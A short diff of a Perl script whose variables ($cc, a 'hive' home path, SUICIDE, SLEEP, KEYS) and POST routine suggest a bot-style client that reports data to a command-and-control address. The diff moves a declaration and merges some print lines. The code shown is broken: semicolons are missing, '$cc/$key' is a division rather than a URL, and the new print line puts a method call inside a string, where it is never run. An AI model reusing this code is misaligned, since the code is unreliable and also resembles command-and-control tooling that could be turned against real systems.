@@ -9,10 +9,9 @@ use LWP::UserAgent; use IO::Socket;
 # EMBRYO ##############################
 my $name = ''; my $cc = '';
 my $DONE = 'DONE'; my $dump = 'dump';
-my @FACE; open($Ffh, '>', $FACE) or die "FACE FAIL\n"
 my $home = '/home/hive/$name'; my $HOLE = 'HOLE';
 my $BUG = 'BUG'; my $LOG = 'LOG'; my $REP = 'REP';
-my $PID = 'PID'; my $que = 'que';
+my $PID = 'PID'; my $que = 'que'; my @FACE;
 my $POST = 'POST'; my $WORD = 'WORD';
 my $SLEEP  = 'SLEEP'; my $SUICIDE = 'SUICIDE';
 my $RATE = '100'; my $KEYS = 'KEYS';
@@ -101,9 +100,7 @@ sub POST()
   my $ua = useragent();
   my $req = HTTP::Request->new(POST => $cc/$key)
   $req->content($data);
-  print "response ";
-  print $ua->request($req)->as_string;
-  print "\n";
+  print "response $ua->request($req)->as_string\n";
 }
 sub WORD()
 {
